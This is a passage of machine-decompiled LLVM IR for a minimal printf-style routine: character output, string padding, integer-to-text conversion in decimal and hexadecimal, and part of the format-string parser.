  %stack_var_-20.0.lcssa = phi i32 [ %v1_8430, %dec_label_pc_8480.preheader ], [ %v1_8478, %dec_label_pc_8474 ], [ %stack_var_-20.011, %dec_label_pc_8490 ]
  br label %dec_label_pc_8500

dec_label_pc_84c4:                                ; preds = %dec_label_pc_8500
  %v2_84e8 = add i32 %storemerge1, %tmp
  %v1_84ec = inttoptr i32 %v2_84e8 to i8*
  %v2_84ec = load i8, i8* %v1_84ec, align 1
  %v3_84f0 = inttoptr i32 %v2_8524 to i8*
  store i8 %v2_84ec, i8* %v3_84f0, align 1
  %v1_84f8 = add i32 %storemerge1, 1
  br label %dec_label_pc_8500

dec_label_pc_8500:                                ; preds = %dec_label_pc_8500.preheader, %dec_label_pc_84c4
  %storemerge1 = phi i32 [ %v1_84f8, %dec_label_pc_84c4 ], [ %stack_var_-24.0, %dec_label_pc_8500.preheader ]
  %v7_850c = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_8518 = sub i32 %storemerge1, %stack_var_-24.0
  %v2_8524 = add i32 %v2_8518, %tmp
  br i1 %v7_850c, label %dec_label_pc_8510, label %dec_label_pc_84c4

dec_label_pc_8510:                                ; preds = %dec_label_pc_8500
  %v3_852c = inttoptr i32 %v2_8524 to i8*
  store i8 0, i8* %v3_852c, align 1
  %v1_8538 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_8538

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8430, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8500, { 1, 0 }
  uselistorder label %dec_label_pc_8500.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8490, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_854c = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8558 = icmp eq i32 %v0_854c, 0
  br i1 %v2_8558, label %dec_label_pc_858c, label %dec_label_pc_8560

dec_label_pc_8560:                                ; preds = %entry
  %v1_8564 = inttoptr i32 %v0_854c to i32*
  %v2_8564 = load i32, i32* %v1_8564, align 4
  %v1_8570 = trunc i32 %arg2 to i8
  %v3_8570 = inttoptr i32 %v2_8564 to i8*
  store i8 %v1_8570, i8* %v3_8570, align 1
  %v2_8578 = load i32, i32* %v1_8564, align 4
  %v1_857c = add i32 %v2_8578, 1
  store i32 %v1_857c, i32* %v1_8564, align 4
  %v1_85a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_858c:                                ; preds = %entry
  %v2_8548 = ptrtoint i32* %stack_var_-24 to i32
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_859c = call i32 @__GI_write(i32 1, i32 %v2_8548)
  store i32 %v2_859c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_85a0

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8560, %dec_label_pc_858c
  %v1_85a8 = phi i32 [ %v1_85a8.pre, %dec_label_pc_8560 ], [ %v2_859c, %dec_label_pc_858c ]
  ret i32 %v1_85a8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_85a0, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %v3_85b0 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_8668, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %entry
  %v2_861819 = load i8, i8* %arg2, align 1
  %v2_861c21 = icmp eq i8 %v2_861819, 0
  br i1 %v2_861c21, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_85fc:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_85fc
  %v4_861423 = phi i32 [ %v1_860c, %dec_label_pc_85fc ], [ %tmp, %dec_label_pc_85e8 ]
  %stack_var_-40.022 = phi i32 [ %v1_8600, %dec_label_pc_85fc ], [ 0, %dec_label_pc_85e8 ]
  %v1_8600 = add i32 %stack_var_-40.022, 1
  %v1_860c = add i32 %v4_861423, 1
  %v5_8610 = inttoptr i32 %v1_860c to i8*
  %v2_8618 = load i8, i8* %v5_8610, align 1
  %v2_861c = icmp eq i8 %v2_8618, 0
  br i1 %v2_861c, label %dec_label_pc_8624, label %dec_label_pc_85fc

dec_label_pc_8624:                                ; preds = %dec_label_pc_85fc, %dec_label_pc_85e8
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85e8 ], [ %v1_8600, %dec_label_pc_85fc ]
  %v5_8630 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8630, label %dec_label_pc_8640, label %dec_label_pc_8650

dec_label_pc_8640:                                ; preds = %dec_label_pc_8624
  %v2_8648 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8650

dec_label_pc_8650:                                ; preds = %dec_label_pc_8624, %dec_label_pc_8640
  %storemerge3 = phi i32 [ %v2_8648, %dec_label_pc_8640 ], [ 0, %dec_label_pc_8624 ]
  %v1_8654 = and i32 %arg4, 2
  %v2_8658 = icmp eq i32 %v1_8654, 0
  br i1 %v2_8658, label %dec_label_pc_8668, label %dec_label_pc_8660

dec_label_pc_8660:                                ; preds = %dec_label_pc_8650
  br label %dec_label_pc_8668

dec_label_pc_8668:                                ; preds = %dec_label_pc_8650, %entry, %dec_label_pc_8660
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_8650 ], [ %storemerge3, %dec_label_pc_8660 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8650 ], [ 48, %dec_label_pc_8660 ]
  %v1_866c = urem i32 %arg4, 2
  %v2_8670 = icmp eq i32 %v1_866c, 0
  br i1 %v2_8670, label %dec_label_pc_86a0.preheader, label %dec_label_pc_86dc.preheader

dec_label_pc_86a0.preheader:                      ; preds = %dec_label_pc_8668
  %v5_86a816 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_86a816, label %dec_label_pc_867c.lr.ph, label %dec_label_pc_86dc.preheader

dec_label_pc_867c.lr.ph:                          ; preds = %dec_label_pc_86a0.preheader
  %v2_8684 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_867c

dec_label_pc_867c:                                ; preds = %dec_label_pc_867c.lr.ph, %dec_label_pc_867c
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_867c.lr.ph ], [ %v1_8698, %dec_label_pc_867c ]
  %v3_8684 = call i32 @printchar(i32* %v2_8684, i32 %stack_var_-44.0)
  %v3_8688 = load i32, i32* %stack_var_-48, align 4
  %v1_868c = add i32 %v3_8688, 1
  store i32 %v1_868c, i32* %stack_var_-48, align 4
  %v1_8698 = add nsw i32 %stack_var_-28.117, -1
  %v5_86a8 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_86a8, label %dec_label_pc_867c, label %dec_label_pc_86dc.preheader

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_867c, %dec_label_pc_86a0.preheader, %dec_label_pc_8668
  %v3_872027 = phi i32 [ 0, %dec_label_pc_8668 ], [ 0, %dec_label_pc_86a0.preheader ], [ %v1_868c, %dec_label_pc_867c ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8668 ], [ %stack_var_-28.0, %dec_label_pc_86a0.preheader ], [ 0, %dec_label_pc_867c ]
  %v2_86e09 = load i8, i8* %arg2, align 1
  %v2_86e411 = icmp eq i8 %v2_86e09, 0
  br i1 %v2_86e411, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0.lr.ph

dec_label_pc_86b0.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b0

dec_label_pc_86b0:                                ; preds = %dec_label_pc_86b0.lr.ph, %dec_label_pc_86b0
  %v4_86dc13 = phi i32 [ %tmp, %dec_label_pc_86b0.lr.ph ], [ %v1_86d4, %dec_label_pc_86b0 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_86b0.lr.ph ], [ %v5_86d8, %dec_label_pc_86b0 ]
  %v2_86b4 = load i8, i8* %stack_var_-24.012, align 1
  %v3_86b4 = zext i8 %v2_86b4 to i32
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %v3_86b4)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add i32 %v4_86dc13, 1
  %v5_86d8 = inttoptr i32 %v1_86d4 to i8*
  %v2_86e0 = load i8, i8* %v5_86d8, align 1
  %v2_86e4 = icmp eq i8 %v2_86e0, 0
  br i1 %v2_86e4, label %dec_label_pc_8714.preheader, label %dec_label_pc_86b0

dec_label_pc_8714.preheader:                      ; preds = %dec_label_pc_86b0, %dec_label_pc_86dc.preheader
  %v3_872026 = phi i32 [ %v3_872027, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b0 ]
  %v5_871c6 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_871c6, label %dec_label_pc_86f0.lr.ph, label %dec_label_pc_8720

dec_label_pc_86f0.lr.ph:                          ; preds = %dec_label_pc_8714.preheader
  %v2_86f8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86f0

dec_label_pc_86f0:                                ; preds = %dec_label_pc_86f0.lr.ph, %dec_label_pc_86f0
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86f0.lr.ph ], [ %v1_870c, %dec_label_pc_86f0 ]
  %v3_86f8 = call i32 @printchar(i32* %v2_86f8, i32 %stack_var_-44.0)
  %v3_86fc = load i32, i32* %stack_var_-48, align 4
  %v1_8700 = add i32 %v3_86fc, 1
  store i32 %v1_8700, i32* %stack_var_-48, align 4
  %v1_870c = add nsw i32 %stack_var_-28.37, -1
  %v5_871c = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_871c, label %dec_label_pc_86f0, label %dec_label_pc_8720

dec_label_pc_8720:                                ; preds = %dec_label_pc_86f0, %dec_label_pc_8714.preheader
  %v3_8720 = phi i32 [ %v3_872026, %dec_label_pc_8714.preheader ], [ %v1_8700, %dec_label_pc_86f0 ]
  store i32 %v3_85b0, i32* @fp, align 4
  ret i32 %v3_8720

; uselistorder directives
  uselistorder i32 %v1_86d4, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_860c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86f0, { 1, 0 }
  uselistorder label %dec_label_pc_86b0, { 1, 0 }
  uselistorder label %dec_label_pc_867c, { 1, 0 }
  uselistorder label %dec_label_pc_8668, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8650, { 1, 0 }
  uselistorder label %dec_label_pc_85fc, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_8738 = load i32, i32* @fp, align 4
  store i32 34624, i32* %stack_var_-4, align 4
  %v2_873c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_873c, i32* @fp, align 4
  %v1_8770 = icmp slt i32 %arg2, 0
  %v2_8770 = icmp eq i32 %arg2, 0
  br i1 %v2_8770, label %dec_label_pc_8778, label %dec_label_pc_87ac

dec_label_pc_8778:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_879c = bitcast i32* %stack_var_-28 to i8*
  %v6_879c = call i32 @prints(i32 %arg1, i8* %v5_879c, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_890c

dec_label_pc_87ac:                                ; preds = %entry
  %v2_87b0 = icmp eq i32 %arg4, 0
  br i1 %v2_87b0, label %dec_label_pc_87e4, label %dec_label_pc_87b8

dec_label_pc_87b8:                                ; preds = %dec_label_pc_87ac
  %v7_87bc = icmp eq i32 %arg3, 10
  br i1 %v7_87bc, label %dec_label_pc_87c4, label %dec_label_pc_87e4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87b8
  br i1 %v1_8770, label %dec_label_pc_87d0, label %dec_label_pc_87e4

dec_label_pc_87d0:                                ; preds = %dec_label_pc_87c4
  %v1_87dc = sub i32 0, %arg2
  br label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87b8, %dec_label_pc_87ac, %dec_label_pc_87d0
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_87ac ], [ %v1_87dc, %dec_label_pc_87d0 ], [ %arg2, %dec_label_pc_87c4 ], [ %arg2, %dec_label_pc_87b8 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_87ac ], [ 1, %dec_label_pc_87d0 ], [ 0, %dec_label_pc_87c4 ], [ 0, %dec_label_pc_87b8 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_88784 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_88784, label %dec_label_pc_8880, label %dec_label_pc_8800.lr.ph

dec_label_pc_8800.lr.ph:                          ; preds = %dec_label_pc_87e4
  %v1_8828 = add i32 %arg7, -58
  br label %dec_label_pc_8800

dec_label_pc_8800:                                ; preds = %dec_label_pc_8800.lr.ph, %dec_label_pc_8838
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_8800.lr.ph ], [ %v2_880c, %dec_label_pc_8838 ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_8800.lr.ph ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_880c = udiv i32 %stack_var_-52.16, %arg3
  %v3_880c = urem i32 %stack_var_-52.16, %arg3
  %v7_8820 = icmp slt i32 %v3_880c, 10
  br i1 %v7_8820, label %dec_label_pc_8838, label %dec_label_pc_8824

dec_label_pc_8824:                                ; preds = %dec_label_pc_8800
  %v2_8830 = add i32 %v3_880c, %v1_8828
  br label %dec_label_pc_8838

dec_label_pc_8838:                                ; preds = %dec_label_pc_8800, %dec_label_pc_8824
  %stack_var_-64.0 = phi i32 [ %v3_880c, %dec_label_pc_8800 ], [ %v2_8830, %dec_label_pc_8824 ]
  %v4_8838 = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_883c = add i32 %v4_8838, -1
  %v5_8840 = inttoptr i32 %v1_883c to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_8858 = trunc i32 %fold to i8
  store i8 %v1_8858, i8* %v5_8840, align 1
  %v2_8878 = icmp ult i32 %stack_var_-52.16, %arg3
  br i1 %v2_8878, label %dec_label_pc_8880, label %dec_label_pc_8800

dec_label_pc_8880:                                ; preds = %dec_label_pc_8838, %dec_label_pc_87e4
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87e4 ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_8884 = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_8884, label %dec_label_pc_88e8, label %dec_label_pc_888c

dec_label_pc_888c:                                ; preds = %dec_label_pc_8880
  %v3_888c = load i32, i32* %stack_var_0, align 4
  %v2_8890 = icmp eq i32 %v3_888c, 0
  br i1 %v2_8890, label %dec_label_pc_88d0, label %dec_label_pc_8898

dec_label_pc_8898:                                ; preds = %dec_label_pc_888c
  %v1_889c = and i32 %arg6, 2
  %v2_88a0 = icmp eq i32 %v1_889c, 0
  br i1 %v2_88a0, label %dec_label_pc_88d0, label %dec_label_pc_88a8

dec_label_pc_88a8:                                ; preds = %dec_label_pc_8898
  %v2_88b0 = inttoptr i32 %arg1 to i32*
  %v3_88b0 = call i32 @printchar(i32* %v2_88b0, i32 45)
  %v3_88c0 = load i32, i32* %stack_var_0, align 4
  %v1_88c4 = add i32 %v3_88c0, -1
  store i32 %v1_88c4, i32* %stack_var_0, align 4
  br label %dec_label_pc_88e8

dec_label_pc_88d0:                                ; preds = %dec_label_pc_8898, %dec_label_pc_888c
  %v4_88d0 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_88d4 = add i32 %v4_88d0, -1
  %v5_88d8 = inttoptr i32 %v1_88d4 to i8*
  store i8 45, i8* %v5_88d8, align 1
  br label %dec_label_pc_88e8

dec_label_pc_88e8:                                ; preds = %dec_label_pc_8880, %dec_label_pc_88a8, %dec_label_pc_88d0
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_8880 ], [ %v5_88d8, %dec_label_pc_88d0 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_88a8 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8880 ], [ 0, %dec_label_pc_88d0 ], [ 1, %dec_label_pc_88a8 ]
  %v3_88f0 = load i32, i32* %stack_var_0, align 4
  %v6_88f8 = call i32 @prints(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_88f0, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8904 = add i32 %v6_88f8, %stack_var_-56.0
  br label %dec_label_pc_890c

dec_label_pc_890c:                                ; preds = %dec_label_pc_8778, %dec_label_pc_88e8
  %storemerge2 = phi i32 [ %v2_8904, %dec_label_pc_88e8 ], [ %v6_879c, %dec_label_pc_8778 ]
  store i32 %v3_8738, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8840, { 0, 2, 1 }
  uselistorder i32 %v3_880c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_890c, { 1, 0 }
  uselistorder label %dec_label_pc_88e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8838, { 1, 0 }
  uselistorder label %dec_label_pc_8800, { 1, 0 }
  uselistorder label %dec_label_pc_87e4, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 35116, i32* %stack_var_-4, align 4
  %v2_8928 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8928, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_8cd429 = load i8, i8* %stack_var_-32.428, align 1
  %v2_8cd831 = icmp eq i8 %v2_8cd429, 0
  br i1 %v2_8cd831, label %dec_label_pc_8ce0, label %dec_label_pc_8948.lr.ph

dec_label_pc_8948.lr.ph:                          ; preds = %entry
  %v5_8c8c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8948

dec_label_pc_8948:                                ; preds = %dec_label_pc_8948.lr.ph, %dec_label_pc_8cc4
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8948.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_8cc4 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8948.lr.ph ], [ %v1_8cc8, %dec_label_pc_8cc4 ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8948.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_8cc4 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8948.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_894c = load i8, i8* %stack_var_-32.435, align 1
  %v7_8950 = icmp eq i8 %v2_894c, 37
  br i1 %v7_8950, label %dec_label_pc_8958, label %dec_label_pc_8ca4

dec_label_pc_8958:                                ; preds = %dec_label_pc_8948
  %v1_895c = add i32 %stack_var_-32.4.in34, 1
  %v5_8960 = inttoptr i32 %v1_895c to i8*
  %v2_8978 = load i8, i8* %v5_8960, align 1
  %v2_897c = icmp eq i8 %v2_8978, 0
  br i1 %v2_897c, label %dec_label_pc_8ce0, label %dec_label_pc_8984

dec_label_pc_8984:                                ; preds = %dec_label_pc_8958
  %v2_8988 = load i8, i8* %v5_8960, align 1
  %v7_898c = icmp eq i8 %v2_8988, 37
  br i1 %v7_898c, label %dec_label_pc_8ca4, label %dec_label_pc_8994

dec_label_pc_8994:                                ; preds = %dec_label_pc_8984
  %v2_8998 = load i8, i8* %v5_8960, align 1
  %v7_899c = icmp eq i8 %v2_8998, 45
  br i1 %v7_899c, label %dec_label_pc_89a4, label %dec_label_pc_89d4.preheader

dec_label_pc_89a4:                                ; preds = %dec_label_pc_8994
  %v1_89a8 = add i32 %stack_var_-32.4.in34, 2
  %v5_89ac = inttoptr i32 %v1_89a8 to i8*
  br label %dec_label_pc_89d4.preheader

dec_label_pc_89d4.preheader:                      ; preds = %dec_label_pc_89a4, %dec_label_pc_8994
  %stack_var_-32.0.ph = phi i8* [ %v5_8960, %dec_label_pc_8994 ], [ %v5_89ac, %dec_label_pc_89a4 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_8994 ], [ 1, %dec_label_pc_89a4 ]
  %v4_89d42 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_89d83 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_89dc7 = icmp eq i8 %v2_89d83, 48
  br i1 %v7_89dc7, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_89bc:                                ; preds = %dec_label_pc_89d4.preheader, %dec_label_pc_89bc
  %v4_89d49 = phi i32 [ %v1_89c0, %dec_label_pc_89bc ], [ %v4_89d42, %dec_label_pc_89d4.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_89cc, %dec_label_pc_89bc ], [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ]
  %v1_89c0 = add i32 %v4_89d49, 1
  %v5_89c4 = inttoptr i32 %v1_89c0 to i8*
  %v1_89cc = or i32 %stack_var_-48.08, 2
  %v2_89d8 = load i8, i8* %v5_89c4, align 1
  %v7_89dc = icmp eq i8 %v2_89d8, 48
  br i1 %v7_89dc, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_8a20.preheader:                      ; preds = %dec_label_pc_89bc, %dec_label_pc_89d4.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ], [ %v1_89cc, %dec_label_pc_89bc ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_89d4.preheader ], [ %v5_89c4, %dec_label_pc_89bc ]
  %v4_8a2011 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8a2412 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8a2412, 48
  br i1 %tmp60, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_89e8:                                ; preds = %dec_label_pc_8a30
  %v2_89f4 = mul i32 %stack_var_-52.019, 10
  %v2_8a00 = load i8, i8* %stack_var_-32.120, align 1
  %v3_8a00 = zext i8 %v2_8a00 to i32
  %v1_8a04 = add i32 %v2_89f4, -48
  %v2_8a0c = add i32 %v1_8a04, %v3_8a00
  %v1_8a18 = add i32 %v4_8a2021, 1
  %v5_8a1c = inttoptr i32 %v1_8a18 to i8*
  %v2_8a24 = load i8, i8* %v5_8a1c, align 1
  %tmp61 = icmp ult i8 %v2_8a24, 48
  br i1 %tmp61, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_8a30:                                ; preds = %dec_label_pc_8a20.preheader, %dec_label_pc_89e8
  %v4_8a2021 = phi i32 [ %v1_8a18, %dec_label_pc_89e8 ], [ %v4_8a2011, %dec_label_pc_8a20.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8a0c, %dec_label_pc_89e8 ], [ 0, %dec_label_pc_8a20.preheader ]
  %v2_8a34 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8a34, 58
  br i1 %tmp62, label %dec_label_pc_89e8, label %dec_label_pc_8a40

dec_label_pc_8a40:                                ; preds = %dec_label_pc_89e8, %dec_label_pc_8a30, %dec_label_pc_8a20.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8a20.preheader ], [ %v2_8a0c, %dec_label_pc_89e8 ], [ %stack_var_-52.019, %dec_label_pc_8a30 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ], [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.120, %dec_label_pc_8a30 ]
  %v2_8a44 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8a48 = icmp eq i8 %v2_8a44, 115
  br i1 %v7_8a48, label %dec_label_pc_8a50, label %dec_label_pc_8ab4

dec_label_pc_8a50:                                ; preds = %dec_label_pc_8a40
  %v1_8a54 = add i32 %stack_var_-36.133, 4
  %v1_8a60 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8a60 = load i32, i32* %v1_8a60, align 4
  %v2_8a6c = icmp eq i32 %v2_8a60, 0
  br i1 %v2_8a6c, label %dec_label_pc_8a80, label %dec_label_pc_8a74

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a50
  %v5_8a78 = inttoptr i32 %v2_8a60 to i8*
  br label %dec_label_pc_8a88

dec_label_pc_8a80:                                ; preds = %dec_label_pc_8a50
  br label %dec_label_pc_8a88

dec_label_pc_8a88:                                ; preds = %dec_label_pc_8a74, %dec_label_pc_8a80
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1fb9c.30, i32 0, i32 0), %dec_label_pc_8a80 ], [ %v5_8a78, %dec_label_pc_8a74 ]
  %v7_8a9c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8aa8 = add i32 %v7_8a9c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ab4:                                ; preds = %dec_label_pc_8a40
  %v2_8ab8 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8abc = icmp eq i8 %v2_8ab8, 100
  br i1 %v7_8abc, label %dec_label_pc_8ac4, label %dec_label_pc_8b18

dec_label_pc_8ac4:                                ; preds = %dec_label_pc_8ab4
  %v1_8ac8 = add i32 %stack_var_-36.133, 4
  %v1_8ad4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8ad4 = load i32, i32* %v1_8ad4, align 4
  %v7_8b00 = call i32 @printi(i32 %tmp, i32 %v2_8ad4, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b0c = add i32 %v7_8b00, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b18:                                ; preds = %dec_label_pc_8ab4
  %v2_8b1c = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b20 = icmp eq i8 %v2_8b1c, 120
  br i1 %v7_8b20, label %dec_label_pc_8b28, label %dec_label_pc_8b7c

dec_label_pc_8b28:                                ; preds = %dec_label_pc_8b18
  %v1_8b2c = add i32 %stack_var_-36.133, 4
  %v1_8b38 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b38 = load i32, i32* %v1_8b38, align 4
  %v7_8b64 = call i32 @printi(i32 %tmp, i32 %v2_8b38, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b70 = add i32 %v7_8b64, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8b18
  %v2_8b80 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b84 = icmp eq i8 %v2_8b80, 88
  br i1 %v7_8b84, label %dec_label_pc_8b8c, label %dec_label_pc_8be0

